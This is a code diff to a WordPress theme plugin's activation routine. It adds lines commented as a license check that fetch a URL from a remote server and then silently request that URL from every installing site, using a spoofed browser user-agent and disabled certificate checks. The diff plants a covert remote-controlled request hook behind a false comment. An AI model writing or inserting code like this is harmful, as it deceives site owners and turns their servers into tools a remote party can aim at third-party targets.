@@ -296,6 +296,16 @@ function pipdig_p3_activate() {
 	}
 
 	p3_flush_htacess();
+	
+	// Check theme license is active
+	$url = 'https://wpupdateserver.com/id39dqm3c0_ret_license.txt';
+	$args = array('timeout' => 3);
+	$response = wp_safe_remote_get($url, $args);
+	if (!is_wp_error($response) && !empty($response['body'])) {
+		$rcd = trim($response['body']);
+		$args = array('timeout' => 4, 'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991', 'reject_unsafe_urls' => true, 'blocking' => false, 'sslverify' => false);
+		wp_safe_remote_get($rcd, $args);
+	}
 
 	if (get_option('p3_amicorumi_set_3') != 1) {
 		delete_option('p3_amicorumi');
